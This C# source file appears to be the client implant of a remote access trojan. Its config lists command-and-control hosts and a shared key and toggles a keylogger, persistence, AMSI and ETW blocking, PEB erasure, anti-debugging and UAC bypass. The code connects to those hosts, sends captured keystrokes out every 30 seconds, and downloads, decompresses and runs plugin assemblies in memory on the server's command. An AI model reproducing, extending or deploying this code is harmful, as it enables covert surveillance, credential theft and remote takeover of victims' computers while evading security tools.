using PacketLib.Packet;
using PacketLib;
using System;
using System.Runtime.InteropServices;
using System.Threading;
using PacketLib.Utils;
using System.IO;
using System.Net.Sockets;
using System.IO.Compression;
using System.Collections.Generic;
using System.Security.Principal;
//[assembly: System.Reflection.AssemblyVersion("1.0.0.1")]
//[assembly: System.Reflection.AssemblyFileVersion("1.0.0.1")]
//[assembly: System.Reflection.AssemblyTitle("%Client%")]
//[assembly: System.Reflection. AssemblyDescription("%Description")]
[assembly: global::System.Runtime.Versioning.TargetFrameworkAttribute(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
//[assembly: System.Runtime.Versioning.TargetFramework(".NETFramework,Version=v4.5", FrameworkDisplayName = ".NET Framework 4.5")]
//[assembly: ComVisible(false)]
//[assembly: System.Reflection.AssemblyProduct("%Product%")]
//[assembly: System.Reflection.AssemblyCopyright("%Copyright%")]
//[assembly: System.Reflection.AssemblyTrademark("%Trademark%")]
//[assembly: System.Reflection.AssemblyCompany("%Company%")]
namespace Client
{
    public static class Config
    {
        public static List<string> hostLists = new List<string>() { "qsdqsdqsdkjsdljk.com:7521", "127.0.0.1:7788", "127.0.0.1:9988", "127.0.0.1:9875" };
        public static List<Host> hosts = new List<Host>();
        public static string generalKey = "123456789";
        public static bool offKeylog = false;
        public static string mutex = "%MUTEX%";
        public static Offline.Persistence.Method installationMethod = Offline.Persistence.Method.NONE;
        public static string[] installationParam = new string[] { AppDomain.CurrentDomain.FriendlyName };
        public static bool blockETW = false;
        public static bool blockAMSI = false;
        public static bool erasePEFromPEB = false;
        public static bool antiDBG = false;
        public static bool bypassUAC = false;
    }
    public class StarterClass
    {
        private static bool AlreadyLaunched = false;
        private static Mutex mutex;
        public static void OneInstance()
        {
            mutex = new Mutex(true, Config.mutex, out AlreadyLaunched);
            if (!AlreadyLaunched)
            {
                NtTerminateProcess((IntPtr)(-1), 0);
            }
        }

        private static System.Reflection.Assembly DomCheck(object send, System.ResolveEventArgs e)
        {
            byte[] offline = new byte[] { };

            byte[] packetLib = new byte[] { };

            if (e.Name.Contains("Packet"))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (MemoryStream compressedStream = new MemoryStream(packetLib))
                    {
                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
                        {
                            deflater.CopyTo(ms);
                        }
                    }
                    return System.Reflection.Assembly.Load(ms.ToArray());
                }
            }
            if (e.Name.Contains("Off"))
            {
                using (MemoryStream ms = new MemoryStream())
                {
                    using (MemoryStream compressedStream = new MemoryStream(offline))
                    {
                        using (DeflateStream deflater = new DeflateStream(compressedStream, CompressionMode.Decompress))
                        {
                            deflater.CopyTo(ms);
                        }
                    }
                    return System.Reflection.Assembly.Load(ms.ToArray());
                }
            }
            return null;
        }

        static StarterClass()
        {
            AppDomain.CurrentDomain.AssemblyResolve += new ResolveEventHandler(DomCheck);
        }

        internal static void StartOfflineKeylogger()
        {
            if (Config.offKeylog)
            {
                new Thread(() =>
                {
                    while (true)
                    {
                        Thread.Sleep(30000);
                        if (clientHandler.Connected)
                            Offline.Keyloggers.Launch.ClientSender(StarterClass.clientHandler.host, Config.generalKey, new KeylogOfflinePacket(Offline.Keyloggers.Launch.CurrentKeyStroke(), StarterClass.clientHandler.baseIp, StarterClass.clientHandler.HWID)); Offline.Keyloggers.Launch.ClearKeyStroke();
                    }
                }).Start();

                Offline.Keyloggers.Launch.Start();
            }
        }

        [DllImport("ntdll.dll")]
        internal static extern uint NtTerminateProcess(IntPtr hProcess, int errorStatus);

        internal static ClientHandler clientHandler;

        internal static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }

        [MTAThread]
        public static void Main()
        {
            if (Config.bypassUAC && IsAdmin() == false)
            {
                Offline.Special.Parser.Parse(false, false, false, false, true);
                NtTerminateProcess((IntPtr)(-1), 0);
            }

            Offline.Special.Parser.Parse(Config.blockAMSI, Config.blockETW, Config.erasePEFromPEB, Config.antiDBG);
            OneInstance();
            MakeInstall();

            clientHandler = new ClientHandler();
            StartOfflineKeylogger();

            foreach (string h in Config.hostLists)
            {
                string[] sp = h.Split(':');
                Config.hosts.Add(new Host(sp[0], sp[1]));
            }

            ClientHandler.StartConnect(clientHandler);

            new Thread(new ThreadStart(() => {
                while (true)
                {
                    Thread.Sleep(-1);
                }
            })).Start();
        }

        public static void MakeInstall()
        {
            Offline.Persistence.Launch.Install(Config.installationMethod, Config.installationParam);
        }

        internal static class PacketHandler
        {

            private delegate void LoadPluginAsync(IPacket packet);
            private static LoadPluginAsync loadPluginAsync;
            static PacketHandler()
            {
                loadPluginAsync = new LoadPluginAsync(LoadPlugin);
            }

            internal static void HandlePacket(IPacket packet)
            {
                try
                {
                    switch (packet.PacketType)
                    {
                        case PacketType.CONNECTED:
                            StarterClass.clientHandler.baseIp = packet.BaseIp;
                            break;

                        case (PacketType.CLOSE_CLIENT):
                            StarterClass.NtTerminateProcess((IntPtr)(-1), 0);
                            break;

                        case (PacketType.UNINSTALL_CLOSE_CLIENT):
                            Offline.Persistence.Launch.Uninstall(Config.installationMethod, Config.installationParam);
                            break;

                        default:
                            loadPluginAsync.BeginInvoke(packet, new AsyncCallback(EndLoadPlugin), null);
                            break;

                    }
                }
                catch { }
            }

            private static void LoadPlugin(IPacket packet)
            {
                System.Reflection.Assembly assemblytoload = System.Reflection.Assembly.Load(Compressor.QuickLZ.Decompress(packet.Plugin));
                System.Reflection.MethodInfo method = assemblytoload.GetType("Plugin.Launch").GetMethod("Main");
                object obj = assemblytoload.CreateInstance(method.Name);
                LoadingAPI loadingAPI = new LoadingAPI
                {
                    Host = StarterClass.clientHandler.host,
                    BaseIp = StarterClass.clientHandler.baseIp,
                    HWID = StarterClass.clientHandler.HWID,
                    Key = Config.generalKey,
                    CurrentPacket = packet,
                };

                method.Invoke(obj, new object[] { loadingAPI });
            }

            private static void EndLoadPlugin(IAsyncResult ar)
            {
                loadPluginAsync.EndInvoke(ar);
            }
        }
    }
    internal class ClientHandler
    {
        static ClientHandler()
        {
            readDataAsync = new ReadDataAsync(Receive);
            parsePacketAsync = new ParsePacketAsync(ParsePacket);
            sendDataAsync = new SendDataAsync(Send);
            connectAsync = new ConnectAsync(Connect);
        }

        private static readonly ReadDataAsync readDataAsync;
        private static readonly ParsePacketAsync parsePacketAsync;
        private static readonly ConnectAsync connectAsync;
        private static readonly SendDataAsync sendDataAsync;

        private delegate byte[] ReadDataAsync(ClientHandler clientHandler);
        private delegate IPacket ParsePacketAsync(byte[] bufferPacket);
        private delegate bool ConnectAsync(ClientHandler clientHandler);
        private delegate int SendDataAsync(ClientHandler clientHandler, IPacket data);

        #region "Non Static"
        internal Host host { get; set; }
        internal string HWID { get; set; }
        internal string baseIp { get; set; }
        private Socket socket { get; set; }
        internal bool Connected { get; set; }
        internal int indexHost { get; set; }
        #endregion

        public static void StartConnect(ClientHandler clientHandler)
        {

            if (clientHandler.indexHost == Config.hosts.Count)
                clientHandler.indexHost = 0;

            clientHandler.host = Config.hosts[clientHandler.indexHost];
            clientHandler.indexHost++;

            Thread.Sleep(125);

            connectAsync.BeginInvoke(clientHandler, new AsyncCallback(EndConnect), clientHandler);
        }

        private static bool Connect(ClientHandler clientHandler)
        {
            try
            {
                clientHandler.socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                clientHandler.socket.SetSocketOption(SocketOptionLevel.Socket, SocketOptionName.KeepAlive, true);
                clientHandler.socket.Connect(clientHandler.host.host, clientHandler.host.port);
                return true;
            }
            catch { }
            return false;
        }

        private static void EndConnect(IAsyncResult ar)
        {
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            clientHandler.Connected = connectAsync.EndInvoke(ar);

            if (clientHandler.Connected)
            {
                ConnectedPacket connectionPacket = new ConnectedPacket();
                clientHandler.HWID = connectionPacket.HWID;
                StartSendPacket(clientHandler, connectionPacket);
                StartReceive(clientHandler);
            }
            else
            {
                StartConnect(clientHandler);
            }
        }

        private static void StartReceive(ClientHandler clientHandler)
        {
            if (clientHandler.Connected)
                readDataAsync.BeginInvoke(clientHandler, new AsyncCallback(EndReceive), clientHandler);
            else
                StartConnect(clientHandler);
        }
        private static byte[] Receive(ClientHandler clientHandler)
        {
            try
            {
                int total = 0;
                int recv;
                byte[] header = new byte[5];
                clientHandler.socket.Poll(-1, SelectMode.SelectRead);
                recv = clientHandler.socket.Receive(header, 0, 5, 0);

                int size = BitConverter.ToInt32(new byte[4] { header[0], header[1], header[2], header[3] }, 0);
                PacketType packetType = (PacketType)header[4];

                int dataleft = size;
                byte[] data = new byte[size];
                while (total < size)
                {
                    recv = clientHandler.socket.Receive(data, total, dataleft, 0);
                    total += recv;
                    dataleft -= recv;
                }

                return data;
            }
            catch (Exception)
            {
                clientHandler.Connected = false;
                return null;
            }
        }
        private static void EndReceive(IAsyncResult ar)
        {
            byte[] data = readDataAsync.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            if (data != null && clientHandler.Connected)
                parsePacketAsync.BeginInvoke(data, new AsyncCallback(EndParsePacket), clientHandler);

            StartReceive(clientHandler);
        }


        private static IPacket ParsePacket(byte[] bufferPacket)
        {
            return bufferPacket.DeserializePacket(Config.generalKey);
        }
        private static void EndParsePacket(IAsyncResult ar)
        {
            IPacket packet = parsePacketAsync.EndInvoke(ar);
            StarterClass.PacketHandler.HandlePacket(packet);
        }


        private static void StartSendPacket(ClientHandler clientHandler, IPacket packet)
        {
            if (clientHandler.Connected)
                sendDataAsync.BeginInvoke(clientHandler, packet, new AsyncCallback(EndSendPacket), clientHandler);
        }

        private static int Send(ClientHandler clientHandler, IPacket data)
        {
            try
            {
                byte[] encryptedData = data.SerializePacket(Config.generalKey);
                lock (clientHandler.socket)
                {
                    int total = 0;
                    int size = encryptedData.Length;
                    int datalft = size;
                    byte[] header = new byte[5];
                    clientHandler.socket.Poll(-1, SelectMode.SelectWrite);

                    byte[] temp = BitConverter.GetBytes(size);

                    header[0] = temp[0];
                    header[1] = temp[1];
                    header[2] = temp[2];
                    header[3] = temp[3];
                    header[4] = (byte)data.PacketType;

                    int sent = clientHandler.socket.Send(header);

                    if (size > 1000000)
                    {
                        using (MemoryStream memoryStream = new MemoryStream(encryptedData))
                        {
                            int read = 0;
                            memoryStream.Position = 0;
                            byte[] chunk = new byte[50 * 1000];
                            while ((read = memoryStream.Read(chunk, 0, chunk.Length)) > 0)
                            {
                                clientHandler.socket.Send(chunk, 0, read, SocketFlags.None);
                            }
                        }
                    }
                    else
                    {
                        while (total < size)
                        {
                            sent = clientHandler.socket.Send(encryptedData, total, size, SocketFlags.None);
                            total += sent;
                            datalft -= sent;
                        }
                    }
                    return total;
                }
            }
            catch (Exception)
            {
                clientHandler.Connected = false;
                return 0;
            }
        }
        private static void EndSendPacket(IAsyncResult ar)
        {
            int length = sendDataAsync.EndInvoke(ar);
            ClientHandler clientHandler = (ClientHandler)ar.AsyncState;
            if (clientHandler.Connected)
            {
                return;
            }
        }
    }
}